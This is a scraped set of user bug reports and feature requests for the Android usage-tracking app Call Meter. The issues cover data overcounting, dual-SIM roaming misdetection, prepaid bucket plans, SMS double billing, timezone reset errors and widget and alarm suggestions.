felixb/callmeter,open,Overestimating data usage compared to Android native metering (and telephone provider),"[Label(name=""bug""), Label(name=""cant-fix"")]","Hi

(Android 5.1 - Moto G - kernel 3.4.42-g89906d6 - 221.201.2.falcon_umts.Retail.en.GB - Call Meter 3G v3.11.11)

Android's build in Data Usage monitor (Settings -> Data Usage) reports monthly data usage that matches the providers data usage but Call Meter 3G v3.11.11 overestimates it for the same period. 

Examples-

**May 13th -Jun 12th**
Mobile provider: 274.33Mb
Native Android data use monitor: 273Mb
Call Meter 3G: 291.99Mb

**Apr 13th - 12th May**
Mobile provider: 439.71Mb
Native Android data use monitor: 440Mb
Call Meter 3G: 448Mb

Given that there isn't a configurable billing mode for data usage and that I imagine the data information is coming from pretty much the same source (the kernel), shouldn't Call Meter's estimation match pretty close to Android's native meter?  Surely if there was going to be a discrepancy it would be Call Meter under recording data?

Any ideas why this might be?  I'd like to use a spreadsheet to try to pin down where this discrepancy might be coming from but can't due to #113  

Warm Regards

felixb/callmeter,closed,Feature Request: common limit for more than one plan,[],"My provider gives me a monthly package of 100 minutes.
The minutes can be used for non roaming and also for roaming calls, but are billed different:
- when non roaming, calls in the package are free, calls outside the package cost 0,15
- when roaming, calls in the package cost 0,05, calls outside the package cost 0,20.

Both roaming and non roaming are counted in the same package.
So i have to count the used minutes in two different plans ( non roaming / roaming ), both using the same counter for decision in package / outside package.
So it would be necessary to have a common limit for two / more plans.

Suggestion: 
- implement ( similar to ""NumberGroup"", ""HoursGroup"" ) a ""LimitGroup"" or ""Common Limits Group"".
- implement in the plans a new limittype, ""Common Limit"", which selects one of the ""Common Limits Group"" / ""LimitGroups"".

Then both plans will increase the common minute package and can do the decision ""in / out of package"".
This would also help if a tariff has a package of ""units"", which can be used for SMS or calls and when minutes have different price than SMS.

felixb/callmeter,closed,Second SIM (Dual SIM) is logged as roaming while in its home country,"[Label(name=""cant-fix"")]","Thanks for a great app, really useful! I just have one issue which I'm hoping there is a solution to!

I have a dual SIM Huawei P8 Lite running Android 5.0.1.
The first SIM (id 0) is a UK number, which is correctly identified by Call Meter as roaming while in Switzerland and not roaming while in the UK. 
The second SIM (id 1) is a Swiss number, which is logged by Call Meter as ""roaming"" even when in Switzerland. When I export the logs to CSV, roaming = 1 for any SMS sent from the Swiss number to other Swiss phones within Switzerland (verified I wasn't roaming by looking at my phone account). 

If I go into Settings/About phone/Status/Network/SIM 1 it is shown as 'Roaming', SIM 2 is shown as 'Not Roaming'.

Not sure what the problem could be, but maybe Call Meter assumes the second SIM is roaming simply because the first SIM is roaming? Or Call Meter isn't able to read the 'Not Roaming' value of the second SIM?

felixb/callmeter,closed,Plans with multiple buckets,[],"I'm having difficulty conveying the pricing structure of my operator to Call Meter.

The operator is Tracfone USA, a prepaid. They use three buckets, separate for calls, text (SMS and MMS) and data.  So, e.g., a $20 refill card adds 180 minutes, 180 texts, and 180 MB. This seems to trigger two issues with the Call Meter:

Under Advanced Preferences I selected a Prepaid Plan, and added two more billing periods to keep track of each bucket separately. That seems to work, but in the ""Now"" view under the first billing period Call Meter displays the sum of all three of them (540 rather than the expected 180) and the names of the billing periods are not displayed anywhere which is confusing (see the attached screenshot).

The second issue is that Call Meter seems to be coded around the concept of the balance always being a cash value. But in my case the balance is simply the number of minutes/texts/MBs. So I set the individual costs of each call/SMS/MMS to ""1"" and set the custom currency symbol to "" "" (a space) to get rid of the dollar sign. That seems to work, but as you can see in the screenshot, it looks kind-of ugly (the cumulative ""cost"" displayed under each item is redundant and just clutters the display).

I wonder if there is already a better way to do what I want? Would I be better off using limits instead?

felixb/callmeter,closed,Calls total cost not calculated correctly,[],"I have set up Call Meter NG on my Galaxy S4 (on Android Lollipop) with a simple single plan.

I set the billing mode as 60/60, with a per call cost of zero, and a per minute cost of 3p and no free calls.

Since the date I set this up I have made 5 calls each under 60 seconds, and one which was 2 minutes 6 seconds.  The total cost is therefore 5x0.03 + -0.09 = 24p

Call Minder NG displays:
Out 0.19¬£ ¬¶ 6:13 (6) ¬¶ 3:06

Since calls are billed at ¬£0.03 per minute (60s) then the total cost cannot be ¬£0.19 - it has to be a multiple of ¬£0.03 !

In other words it's a warning about ‚Äúif you keep that pace of using up your minutes you will max out your plan before the end of the billing cycle!""

Hi,

I have 200 local/national (combined) free SMS and 200 free Calls included in my plan.

After first 200 free units my local and national SMS/Calls are charged at different rates. For international and national SMS I have defined Number Groups and connected them with separate plans. For both the Calls and SMS, the hierarchy of the plans is as follows:

International Plan
Free Plan
National Plan
Local Plan

After exhausting first 200 free calls, all the subsequent calls are charged as expected, but at single rate specified in the free plan and still get displayed under free plan. They never fall through to next national or local plan which will provide me with the breakup of my local/national Calls.

Same procedure is applicable for SMS.

Can these scenarios be handled in any way?

Thanks & Regards.

So if I want CM3G apply to a rule when a number falls in a given RANGE I have to create a numbers group with every number in it.

Case A: When a number begins with 01800&#37;, rule X should apply
Case B: When a number begins with between 01801&#37; and 01805&#37;, rule Y should apply.
For case A I have to create a numbers group with 01800&#37; in it!
For case B I have to create a numbers group with 01801&#37;, 01802&#37;, 01803&#37;, ... in it!

RegExp or something like this would be helpful.

Due to some problems with assigning calls, messages and data automatically to the variety of contingents by rule sets (different roaming zones, but also issue 643 and 644), it would be a great help to be able to assign calls, messages and data sessions from the lo manually to contingents.

Now back to the point.
Since this is 1 of my favorite apps, and I wish it is all-in-1 about calls i thought it would be nice to have call confirm embedded in the CM3G, usually these apps are like 50K or less so I hope it would not be so hard to make.
I personally use Call Filter Pro which has it embedded, but i rarely use it to block calls so i can remove it if CM3 has this feature. I will provide few images below. I have seen few Call confirm dialogues and what I like about Call Filter Pro 1 is that it shows with slide animation and background is dimmed (more like with gray filter), so you focus on it, but it misses nice buttons (Call; cancel) and picture of the contact that you are calling. Why now even to show some additional information on the dialogue like b-day or last call event (may be this is too much i admit :P), and even use tone or vibrate on call end. Sometimes like breaks down or the other person hangs up and you wait for a min before you realize that you are alone. 
 So I woke up this morning after one great evening yesterday and i had this thought, just wanted to share with you.

Leave comments please
Regards.

Hi,

I've been using your app for a long while now and I love it. I think you should put some more extra features: call log listing by:date,length,cost, group by numbers (show total this month cost for that number),search for a number in log, list only this month,

I look forward to see a lot more features in the app! Thanks for all your work!
Cheers!

What steps will reproduce the problem? 1. Send SMS
2. or receive SMS 3. - What is the expected output? What do you see instead?
When I send a SMS, I expect to see that 1 SMS is counted and billed. The program counts SMS x 2. If I sent 1 SMS it says 2 and the bill is for these 2. In costs screen I can see that Length is 2, but all SMS I tested where lower than 160 chts. I tries with built in 160 split chars, and activating the option in call meter. Always the same result.
The same happens with received SMS

felixb/callmeter,closed,Call Logs - Call length not same with Telco,"[Label(name=""enhancement""), Label(name=""logic""), Label(name=""wont-fix"")]","_From [sschon...@gmail.com](https://code.google.com/u/113547248965672535272/) on 2011-10-05T10:29:14Z_

When check the call logs with the Telco provided detail usage logs, expect the length of calls recorded same with detail usage log but instead, the length of calls recorded through Call Meter is always 2 seconds less then Telco detail usage log.

This difference probably is Telco dependent and might cause inaccuracy of billing report as a call block of 30 seconds first and 30 seconds follows with 5 cents each block will charge 5 cents for a 29 seconds call length recorded in Call Meter while Telco charge 10 cents for 31 seconds (2 seconds more then Call Meter).

Suggest to allow manual addition length to call length recorded, in order to syn with Telco charge time.

It would be perfect if I could see the call number and minites (in and out) per contact, the messages (in and out) per contact and the mb per application. 

Charts also can be added to show the top callers the top sms sender and the application the download more data.

Moreover, it would be perfect if the aforementioned stats would be presented in deferrent charts for each month (or week, or billing period, etc)...

A new widget or an option to update the counters additionally to the automatic refresh would be useful in my opinion.

I know that i can do it by entering the App and go to preferences etc.
That's not really an easy way to do this =)

Limits are a great feature for those who have limited plans. For those who doesn't, like me, it would be great to have configurable Alarms. I'm pretty interested in having an overall charge alarm to know when I am exceeding, for example, 20‚Ç¨. So my suggestion would be to have both, limits and alarms living togheter as 2 different entities, therefore:
1) When you configure a limit, you will have the possibility to enable/disable its corresponding alarm (each limit should have a built-in alarm).
2) You can setup an alarm (overall alarm or single-plan alarm) without having to configure a limit. 

It is the same idea as having an event in your calendar and its corresponding alarm. You can setup events without alarms, or standalone alarms.

What steps will reproduce the problem? 1. Local timezone is Australia/Sydney  UTC+10  UTC+11=DST=ACTIVE
2. Checked CM3 at 0830 @-01-March, showed 99&#37; of billing period, and counters still showed previous month data.
3. Checked CM3 at 1030, showed 0&#37; of billing period, and counters had zeroed. What is the expected output? What do you see instead? I expected counters to zero at 00:00 according to local timezone.
What happened was that counters zeroed at 10:00 local DST time, which is not 00:00 UTC since DST is active. What version of the product are you using? On what operating system? 3.0RC8 on Gingerbread/CM7 Please provide any additional information below. Seems like CM3 needs to pick up TZ correctly, and also deal with DST.

It would be nice to have a single widget showing my calls and SMS usage rather than a whole widget per item.

(A nice example of widget aesthetics is the '3G watchdog' for data. It also shows a nice level of transparency for the widget background - covered by issue 398 . This, but for calls/sms and data, would be [perfect!)

as an enhancement to to ability to ad individual contacts to the include exlude list, i hope there will be a way to add entire groups from contact list that way we could easly add people to a plan by grouping them alternativly, maybe create special group names under contacts that refer to include/exlude lists. another way is to include exlude by tags that anyone can add under one of the contact information fields (like nunder notes) and include wildcard ability with it as well

I'm using call meter NG, and I think this is the best software on market.
I think there should be call log file that writes down for every month used minutes and data plan so we can track them.
